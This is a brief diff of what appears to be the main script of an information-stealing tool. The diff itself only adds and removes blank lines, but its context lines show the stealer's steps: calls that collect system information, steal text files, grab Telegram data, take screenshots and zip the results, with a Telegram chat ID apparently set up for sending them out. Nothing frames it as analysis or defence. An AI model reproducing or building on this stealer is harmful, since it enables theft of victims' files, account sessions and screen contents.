@@ -14,9 +14,6 @@ userCHAT_ID = ''
 
 
 
-
-
-
 from scripts.send import make_folder
 from scripts.system import system_info
 from scripts.system import screenshoot
@@ -40,6 +37,8 @@ system_info.SystemInfo()
 Files_txt.TxtSteal()
 telegram.Telegram()
 screenshoot.Screenshot()
+
+
 
 try:
     clear.makemeZip()
